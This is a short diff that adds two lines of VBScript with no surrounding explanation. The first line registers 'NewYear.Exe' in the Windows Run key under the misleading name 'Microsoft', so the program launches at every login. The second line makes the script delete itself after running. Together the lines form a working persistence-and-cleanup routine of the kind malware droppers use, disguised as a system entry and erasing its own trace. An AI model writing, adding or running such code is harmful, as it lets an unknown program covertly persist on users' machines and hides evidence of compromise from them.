@@ -1,0 +1,2 @@
+CreateObject("WScript.Shell").RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run\Microsoft", "C:\Windows\System\NewYear.Exe"
+CreateObject("Scripting.FileSystemObject").DeleteFile(WScript.ScriptFullName)
